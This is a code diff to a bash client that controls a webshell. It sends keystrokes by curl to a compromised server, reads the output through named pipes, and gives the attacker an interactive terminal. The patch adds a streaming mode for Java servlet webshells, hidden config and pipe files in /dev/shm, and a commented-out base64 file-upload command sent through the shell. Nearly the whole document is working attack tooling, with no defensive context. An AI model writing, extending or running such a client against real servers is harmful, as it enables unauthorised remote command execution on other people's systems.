@@ -10,6 +10,8 @@ full_stty="no"
 alias_set="no"
 alias_custom=""
 attach="no"
+stream="no"
+stream_keep_alive=5
 URL=""
 FI="/tmp/i"
 FO="/tmp/o"
@@ -43,18 +45,59 @@ available_args=(
     "--alias"
     "--alias-custom"
     "--attach"
+    "--stream"
 )
+
+
+if [ -d "/dev/shm" ]; then
+    FIFO_PATH="/dev/shm/.req_stream_$$"
+    request_time="/dev/shm/.req_time_$$"
+    config_file="/dev/shm/.config.ini_$$"
+else
+    FIFO_PATH="/tmp/.req_stream_$$"
+    request_time="/tmp/.req_time_$$"
+    config_file="/tmp/.config.ini_$$"
+fi
+
+rm -f $FIFO_PATH; mkfifo $FIFO_PATH;
+touch $config_file
+exec 5>&1;
+
+
+get_config_value() {
+    local setting=$1
+    local value=$(grep "^$setting=" "$config_file" | cut -d '=' -f2)
+    echo "$value"
+}
+
+
+update_config() {
+    local setting=$1
+    local value=$2
+
+    # Check if the setting already exists in the configuration file
+    if grep -q "^$setting=" "$config_file"; then
+        # Setting exists, update its value
+        sed -i "s/^$setting=.*/$setting=$value/" "$config_file"
+    else
+        # Setting doesn't exist, add it to the configuration file
+        echo "$setting=$value" >> "$config_file"
+    fi
+}
 
 
 exit_client() {
     echo -e "\nExiting script."
     pstree -A -p $$ | grep -Eow "[0-9]+" | grep -v $$ | xargs kill 2>/dev/null
     rm -f $FIFO_PATH
+    rm -f $request_time
+    rm -f $config_file
     stty sane
     wait
     echo -e "Cleanup complete."
     exit "$1"
 }
+
 
 help_client () {
     echo -e "Usage: $0 [OPTION]... --url [URL]...\n"
@@ -77,6 +120,7 @@ help_client () {
     printf "  %s  %-20s%s\n" "-fo,  " "--fo" "Interactive shell works on named pipes, so change name of stdout, stderr pipe: {--fo /dev/shm/some_output_pipe}"
     printf "  %s  %-20s%s\n" "-d,   " "--default" "Script by default works with no interactive webshell. So flags set default interacte option: --interactive, --stty-raw, --stty-python, --alias. If you want change some of option you need provide next option after default options. {-d --stty-script --shell /bin/bash}"
     printf "  %s  %-20s%s\n" "      " "--attach" "Join a detached running shell process. To join the right shell, you need to use the same pipes that the shell process uses: {--attach --fi /dev/shm/i --fo /dev/shm/o}"
+    printf "  %s  %-20s%s\n" "      " "--stream" "Create request stream. Available for Java Servlet, not working with php: {--stream}"
     printf "  %s  %-20s%s\n" "      " "" "To exit in normal mode stty usage: {ctrl+c} or write: {%:exit}. To exit in raw mode stty usage: {ctrl+alt+q}"
 
     exit_client "0"
@@ -90,27 +134,38 @@ while [ "$#" -gt 0 ]; do
             type_stty="python"
             full_stty="yes"
             alias_set="yes"
+            update_config "INTERACTIVE" "yes"
+            update_config "TYPE_STTY" "python"
+            update_config "FULL_STTY" "yes"
+            update_config "ALIAS_SET" "yes"
             ;;
         "--interactive" | "-i")
             interactive="yes"
+            update_config "INTERACTIVE" "yes"
             ;;
         "--stty-raw")
             full_stty="yes"
+            update_config "FULL_STTY" "yes"
             ;;
         "--stty-python")
             type_stty="python"
+            update_config "TYPE_STTY" "python"
             ;;
         "--stty-script")
             type_stty="script"
+            update_config "TYPE_STTY" "script"
             ;;
         "--stty-expect")
             type_stty="expect"
+            update_config "TYPE_STTY" "expect"
             ;;
         "--stty-custom")
             if [ -n "$2" ]; then
                 type_stty="custom"
+                update_config "TYPE_STTY" "custom"
                 shift 
                 stty_custom="$1"
+                update_config "STTY_CUSTOM" "$1"
             else
                 echo "[-] Error: Argument missing for --stty-custom"
                 exit_client "1"
@@ -119,15 +174,20 @@ while [ "$#" -gt 0 ]; do
         "--attach")
             attach="yes"
             interactive="yes"
+            update_config "ATTACH" "yes"
+            update_config "INTERACTIVE" "yes"
             ;;
         "--alias")
             alias_set="yes"
+            update_config "ALIAS_SET" "yes"
             ;;
         "--alias-custom")
             if [ -n "$2" ]; then
                 alias_set="custom"
+                update_config "ALIAS_SET" "custom"
                 shift 
                 alias_custom="$1"
+                update_config "ALIAS_CUSTOM" "$1"
             else
                 echo "[-] Error: Argument missing for --alias-custom"
                 exit_client "1"
@@ -137,6 +197,7 @@ while [ "$#" -gt 0 ]; do
             if [ -n "$2" ]; then
                 shift 
                 SHELL_CUSTOM="$1"
+                update_config "SHELL_CUSTOM" "$1"
             else
                 echo "[-] Error: Argument missing for --shell"
                 exit_client "1"
@@ -146,6 +207,7 @@ while [ "$#" -gt 0 ]; do
             if [ -n "$2" ]; then
                 shift 
                 URL="$1"
+                update_config "URL" "$1"
             else
                 echo "[-] Error: Argument missing for --url"
                 exit_client "1"
@@ -155,6 +217,7 @@ while [ "$#" -gt 0 ]; do
             if [ -n "$2" ]; then
                 shift 
                 INIT_SHELL="$1"
+                update_config "INIT_SHELL" "$1"
             else
                 echo "[-] Error: Argument missing for --url"
                 exit_client "1"
@@ -164,6 +227,7 @@ while [ "$#" -gt 0 ]; do
             if [ -n "$2" ]; then
                 shift 
                 FI="$1"
+                update_config "FI" "$1"
             else
                 echo "[-] Error: Argument missing for --url"
                 exit_client "1"
@@ -173,19 +237,28 @@ while [ "$#" -gt 0 ]; do
             if [ -n "$2" ]; then
                 shift 
                 FO="$1"
+                update_config "FO" "$1"
             else
                 echo "[-] Error: Argument missing for --url"
                 exit_client "1"
             fi
             ;;
+        "--stream")
+            stream="yes"
+            interactive="yes"
+            update_config "STREAM" "yes"
+            update_config "INTERACTIVE" "yes"
+            ;;
         "--curl" | "-curl")
             type_curl="custom"
+            update_config "TYPE_CURL" "custom"
             shift
             while [ "$#" -gt 0 ]; do
                 if [[ " ${available_args[@]} " =~ " $1 " ]]; then
                     break  
                 else
                     CURL_ARGS+=("$1")
+                    update_config "CURL_ARGS" "$CURL_ARGS"
                     shift
                 fi
             done
@@ -209,15 +282,6 @@ fi
 
 trap 'exit_client "0"' SIGINT 
 
-if [ -d "/dev/shm" ]; then
-    FIFO_PATH="/dev/shm/fifo"
-else
-    FIFO_PATH="/tmp/fifo"
-fi
-
-rm -f $FIFO_PATH; mkfifo $FIFO_PATH;
-exec 5>&1;
-exec 5>&2;
 
 lcurl () {
     if [[ " ${CURL_ARGS[@]} " =~ "-X POST" ]]; then
@@ -228,7 +292,6 @@ lcurl () {
 }
 
 get_output () {
-#    stdbuf -o0 curl -s $URL?o=$FO "${CURL_ARGS[@]}" 2>&5 >&5 
     curl -s -N $URL?o=$FO "${CURL_ARGS[@]}" 2>&5 >&5 
 }
 
@@ -300,15 +363,49 @@ setup_shell() {
 }
 
 
-send_command() {
+keep_alive() {
     while true; do
+        current_time=$(date +%s)
+        local start_time=$(cat $request_time 2>/dev/null) 
+        local elapsed_time=$((current_time - start_time))
+        if [ "$elapsed_time" -ge "$stream_keep_alive" ]; then
+            printf "%s" "%1b%1c" > $FIFO_PATH
+            date +%s > $request_time
+            continue
+        fi
+        sleep 1  
+    done
+}
+
+send_command_stream () {
+    exec 7<>$FIFO_PATH
+    curl -s -N -X POST $URL"?s=$FI" "${CURL_ARGS[@]}" -T - <&7 2>1 >/dev/null
+    cat $FIFO_PATH >/dev/null
+}
+
+send_command_requests () {
+    while true; do
+        local full_stty=$(get_config_value "FULL_STTY")
         chart=$(cat $FIFO_PATH);
         if [[ "$chart" == "%0A" ]]; then
             lcurl "i=$chart&fi=$FI"
         else
-            lcurl "i=$(urlencode "$chart")&fi=$FI"
+            if [[ "$full_stty" == "yes" ]]; then
+                lcurl "i=$(urlencode "$chart")&fi=$FI"
+            else
+                lcurl "i=$(urlencode "$chart")%0A&fi=$FI"
+            fi
         fi
     done
+}
+
+send_command() {
+    if [[ "$stream" == "yes" ]]; then
+        keep_alive &
+        send_command_stream &
+    else 
+        send_command_requests &
+    fi 
 }
 
 read_command_full_stty() {
@@ -320,8 +417,14 @@ read_command_full_stty() {
         # Check if the user wants to exit
         if [[ "$combination" == *$'\x1b\x11'* ]]; then
             exit_client "0"
+#        elif [[ "$combination" == *$'\x1b\x15'* ]]; then
+#            local a=$(cat ./a |base64 -w 0)
+#            echo "Start uploading file"
+#            lcurl "i=%0Aread%20content%3Bprintf%20$content%20%7Cbase64%20-d%20%3E%20/dev/shm/a%0A&fi=$FI"
+#            echo "file upload"
         elif [[ "$combination" == *$'\x1b\x13'* ]]; then
             full_stty="no"
+            update_config "FULL_STTY" "no"
             echo "Change to normal mode stty!"
             break
         fi
@@ -330,7 +433,16 @@ read_command_full_stty() {
             userInput="%0A"
             combination=""
         fi
-        printf "%s" "$userInput" >> "$FIFO_PATH"
+        if [[ "$stream" == "yes" ]]; then 
+            date +%s > $request_time
+            if [[ "$userInput" == "%0A" ]]; then
+                printf "%s" "$userInput" >> "$FIFO_PATH"
+            else
+                printf "%s" "$(urlencode "$userInput")" >> "$FIFO_PATH"
+            fi
+        else
+            printf "%s" "$userInput" >> "$FIFO_PATH"
+        fi 
     done
 }
 
@@ -339,22 +451,25 @@ read_command_semi_stty() {
         if [[ "$command" == "%:stty_raw" ]]; then
             echo "Change to raw mode stty!"
             full_stty="yes"
+            update_config "FULL_STTY" "yes"
             break
         elif [[ "$command" == "%:exit" ]]; then
             exit_client "0"
-
-        elif [[ "$command" != "" ]]; then
-            lcurl "i=$(urlencode "$command")%0A&fi=$FI"
         else
-            lcurl "i=%0A&fi=$FI"
+            if [[ "$stream" == "yes" ]]; then 
+                date +%s > $request_time
+                printf "%s" "$(urlencode "$command")%0A" >> $FIFO_PATH
+            else
+                printf "%s" "$command" >> $FIFO_PATH
+            fi 
         fi
     done
 }
 
 
 if [[ "$interactive" == "yes" ]]; then
-    send_command &
     setup_shell 
+    send_command 
     while true; do 
         if [[ "$full_stty" == "yes" ]]; then
             stty raw -echo;
@@ -373,5 +488,3 @@ else
         fi
     done
 fi
-
-
